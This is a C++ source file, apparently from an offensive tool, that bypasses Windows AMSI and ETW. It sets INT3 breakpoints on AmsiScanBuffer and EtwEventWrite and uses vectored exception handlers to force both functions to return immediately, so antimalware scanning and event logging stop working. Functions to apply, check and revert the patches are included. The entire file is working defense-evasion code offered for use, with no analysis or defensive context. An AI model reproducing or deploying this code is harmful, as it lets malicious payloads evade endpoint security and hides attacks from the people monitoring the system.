#include "patchs.hpp"

PVOID gAmsiHandler = nullptr;
BYTE gAmsiOriginalByte = 0;
void* gAmsiTargetAddr = nullptr;

PVOID gEtwHandler = nullptr;
BYTE gEtwOriginalByte = 0;
void* gEtwTargetAddr = nullptr;

LONG WINAPI AmsiVectoredHandler(EXCEPTION_POINTERS* pExceptionInfo) {
    if (pExceptionInfo->ExceptionRecord->ExceptionCode != EXCEPTION_BREAKPOINT)
        return EXCEPTION_CONTINUE_SEARCH;

    void* addr = pExceptionInfo->ExceptionRecord->ExceptionAddress;
    if (addr != gAmsiTargetAddr)
        return EXCEPTION_CONTINUE_SEARCH;

    DWORD oldProt;
    BYTE* target = (BYTE*)gAmsiTargetAddr;

    if (!VirtualProtect(target, 1, PAGE_EXECUTE_READWRITE, &oldProt))
        return EXCEPTION_CONTINUE_SEARCH;

    BYTE currentByte = *target;
    *target = gAmsiOriginalByte;
    FlushInstructionCache(GetCurrentProcess(), target, 1);

    CONTEXT context = *pExceptionInfo->ContextRecord;

#ifdef _M_X64
    ULONG_PTR ret = *(ULONG_PTR*)(context.Rsp);
    context.Rax = 0;
    context.Rip = ret;
    context.Rsp += 8;
#else
    DWORD ret = *(DWORD*)(context.Esp);
    context.Eax = 0;
    context.Eip = ret;
    context.Esp += 4;
#endif

    * pExceptionInfo->ContextRecord = context;
    *target = 0xCC;
    FlushInstructionCache(GetCurrentProcess(), target, 1);
    VirtualProtect(target, 1, oldProt, &oldProt);

    return EXCEPTION_CONTINUE_EXECUTION;
}
LONG WINAPI EtwVectoredHandler(EXCEPTION_POINTERS* pExceptionInfo) {
    if (pExceptionInfo->ExceptionRecord->ExceptionCode != EXCEPTION_BREAKPOINT)
        return EXCEPTION_CONTINUE_SEARCH;

    void* addr = pExceptionInfo->ExceptionRecord->ExceptionAddress;
    if (addr != gEtwTargetAddr)
        return EXCEPTION_CONTINUE_SEARCH;

    DWORD oldProt;
    BYTE* target = (BYTE*)gEtwTargetAddr;

    if (!VirtualProtect(target, 1, PAGE_EXECUTE_READWRITE, &oldProt))
        return EXCEPTION_CONTINUE_SEARCH;

    BYTE currentByte = *target;
    *target = gEtwOriginalByte;
    FlushInstructionCache(GetCurrentProcess(), target, 1);

    CONTEXT context = *pExceptionInfo->ContextRecord;

#ifdef _M_X64
    ULONG_PTR ret = *(ULONG_PTR*)(context.Rsp);
    context.Rax = 0;
    context.Rip = ret;
    context.Rsp += 8;
#else
    DWORD ret = *(DWORD*)(context.Esp);
    context.Eax = 0;
    context.Eip = ret;
    context.Esp += 4;
#endif

    * pExceptionInfo->ContextRecord = context;

    *target = 0xCC;
    FlushInstructionCache(GetCurrentProcess(), target, 1);
    VirtualProtect(target, 1, oldProt, &oldProt);

    return EXCEPTION_CONTINUE_EXECUTION;
}


int PatchAmsi() {
    if (gAmsiHandler) return 0;

    gAmsiHandler = AddVectoredExceptionHandler(1, AmsiVectoredHandler);
    HMODULE hAmsi = LoadLibraryW(L"amsi.dll");
    if (!hAmsi) return 1;

    gAmsiTargetAddr = (void*)GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!gAmsiTargetAddr) return 1;

    DWORD oldProt;
    BYTE* target = (BYTE*)gAmsiTargetAddr;
    if (!VirtualProtect(target, 1, PAGE_EXECUTE_READWRITE, &oldProt)) return 1;

    gAmsiOriginalByte = *target;
    *target = 0xCC;  // INT3
    FlushInstructionCache(GetCurrentProcess(), target, 1);

    return 0;
}

int RevertPatchAmsi() {
    if (gAmsiHandler) {
        RemoveVectoredExceptionHandler(gAmsiHandler);
        gAmsiHandler = nullptr;
    }

    if (gAmsiTargetAddr) {
        DWORD oldProt;
        BYTE* target = (BYTE*)gAmsiTargetAddr;

        if (VirtualProtect(target, 1, PAGE_EXECUTE_READWRITE, &oldProt)) {
            *target = gAmsiOriginalByte;
            FlushInstructionCache(GetCurrentProcess(), target, 1);
            VirtualProtect(target, 1, oldProt, &oldProt);
        }

        gAmsiTargetAddr = nullptr;
        gAmsiOriginalByte = 0;
    }

    return 0;
}

bool IsAmsiPatched() {
    return gAmsiHandler != nullptr;
}


int PatchETW() {
    if (gEtwHandler) return 0;

    gEtwHandler = AddVectoredExceptionHandler(1, EtwVectoredHandler);

    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        hNtdll = LoadLibraryW(L"ntdll.dll");
        if (!hNtdll) return 1;
    }

    gEtwTargetAddr = (void*)GetProcAddress(hNtdll, "EtwEventWrite");
    if (!gEtwTargetAddr) {
        gEtwTargetAddr = (void*)GetProcAddress(hNtdll, "EtwEventWriteFull");
        if (!gEtwTargetAddr) return 1;
    }

    DWORD oldProt;
    BYTE* target = (BYTE*)gEtwTargetAddr;
    if (!VirtualProtect(target, 1, PAGE_EXECUTE_READWRITE, &oldProt)) return 1;

    gEtwOriginalByte = *target;
    *target = 0xCC;  // INT3
    FlushInstructionCache(GetCurrentProcess(), target, 1);

    return 0;
}

int RevertPatchETW() {
    if (gEtwHandler) {
        RemoveVectoredExceptionHandler(gEtwHandler);
        gEtwHandler = nullptr;
    }

    if (gEtwTargetAddr) {
        DWORD oldProt;
        BYTE* target = (BYTE*)gEtwTargetAddr;

        if (VirtualProtect(target, 1, PAGE_EXECUTE_READWRITE, &oldProt)) {
            *target = gEtwOriginalByte;
            FlushInstructionCache(GetCurrentProcess(), target, 1);
            VirtualProtect(target, 1, oldProt, &oldProt);
        }

        gEtwTargetAddr = nullptr;
        gEtwOriginalByte = 0;
    }

    return 0;
}

bool IsETWPatched() {
    return gEtwHandler != nullptr;
}

int PatchAll() {
    int resultEtw = PatchETW();
    int resultAmsi = PatchAmsi();

    if (resultAmsi != 0 || resultEtw != 0) {
        RevertAll();
        return 1;
    }

    return 0;
}

int RevertAll() {
    RevertPatchETW();
    RevertPatchAmsi();
    return 0;
}

bool IsEverythingPatched() {
    return IsAmsiPatched() && IsETWPatched();
}